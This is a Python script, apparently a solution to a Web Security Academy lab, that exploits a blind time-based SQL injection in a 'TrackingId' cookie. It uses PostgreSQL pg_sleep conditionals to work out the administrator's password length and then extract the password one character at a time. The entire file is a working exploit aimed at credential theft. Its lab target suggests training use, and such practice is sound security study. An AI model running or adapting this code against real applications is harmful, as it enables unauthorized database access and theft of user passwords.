import sys
import requests
import string

def enumerate_password_length(url):
    for i in range(1, 50):
        payload = f"'|| (SELECT CASE WHEN (username='administrator' AND LENGTH(password)={i}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"
        response = requests.get(url, cookies={"TrackingId": payload})
        if response.elapsed.total_seconds() > 4:
            password_length = i
            break
    return password_length

def get_admin_password(url, password_length):
    alphanumeric_characters = string.ascii_lowercase + string.digits
    password = ""
    for i in range(1, password_length + 1):
        for j in alphanumeric_characters:
            payload = f"' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{j}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"
            response = requests.get(url, cookies={'TrackingId': payload})
            if response.elapsed.total_seconds() > 4:
                password += j
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + j)
                sys.stdout.flush()



def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <url>")
        print("Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].rstrip('/')

    print("Enumerating Password Length...")
    password_length = enumerate_password_length(url)
    print(f"Password Length: {password_length}")

    print("Enumerating Password...")
    get_admin_password(url, password_length)
    print()


if __name__ == "__main__":
    main()